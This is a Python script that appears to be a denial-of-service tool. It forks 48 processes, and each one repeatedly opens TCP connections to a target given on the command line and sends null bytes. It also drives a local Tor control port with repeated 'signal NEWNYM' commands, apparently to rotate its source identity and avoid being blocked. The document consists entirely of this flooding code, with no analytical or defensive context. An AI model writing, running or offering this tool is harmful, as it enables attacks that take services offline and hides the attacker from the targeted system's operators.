import socket
import signal
import os
import time

def make_socket(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)
    try:
        sock.connect((host, int(port)))
        print(f"[Connected -> {host}:{port}]")
        return sock
    except socket.error as e:
        print(f"Error: {e}")
        exit(0)

def broke(s, f):
    pass

CONNECTIONS = 8
THREADS = 48

def attack(host, port, identifier):
    sockets = [0] * CONNECTIONS
    signal.signal(signal.SIGPIPE, broke)

    while True:
        for i in range(CONNECTIONS):
            if sockets[i] == 0:
                sockets[i] = make_socket(host, port)
            try:
                sockets[i].send(b"\0")
            except socket.error:
                sockets[i].close()
                sockets[i] = make_socket(host, port)
            else:
                print(f"[{identifier}: Voly Sent]")

        print(f"[{identifier}: Voly Sent]")
        time.sleep(0.3)

def cycle_identity():
    s = make_socket("localhost", "9050")
    s.send(b"AUTHENTICATE \"\"\n")
    
    while True:
        s.send(b"signal NEWNYM\n\x00")
        print("[cycle_identity -> signal NEWNYM]")
        time.sleep(0.3)

if __name__ == "__main__":
    import sys

    if len(sys.argv) != 3:
        cycle_identity()

    for i in range(THREADS):
        if os.fork():
            attack(sys.argv[1], sys.argv[2], i)
        time.sleep(0.2)

    input()
